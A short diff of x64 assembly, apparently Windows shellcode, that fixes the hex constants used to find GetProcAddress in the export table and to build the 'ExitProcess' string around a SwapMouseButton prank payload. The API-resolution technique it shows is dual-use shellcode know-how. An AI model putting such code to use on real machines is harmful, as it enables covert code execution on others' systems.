@@ -37,7 +37,7 @@ _start:
 		mov eax , [rsi + rcx * 4] ;RVA of next function
 		add rax , rbx ; VA of next function
 
-		cmp qword  [rax] , 0x41636f7270546547 ; compare first 8 chars "GetProcA"
+		cmp qword  [rax] , 0x41636f7250746547 ; compare first 8 chars "GetProcA"
 		jnz Get_fun
 		cmp dword  [rax + 8] , 0x65726464      ; "ddre"
 		jnz Get_fun
@@ -106,7 +106,7 @@ _start:
 		call rax          ; call SwapMouseButton(1)
 		
 		; --- build "ExitProcess" string ---
-		mov qword [rsp], 0x74786545726f6350  ; "ExitProc" (little-endian)
+		mov qword [rsp], 0x636f725074697845  ; "ExitProc" (little-endian)
 		mov dword [rsp + 8], 0x73736573      ; "sess"
 		xor eax , eax
 		lea rdi , [rsp + 12]
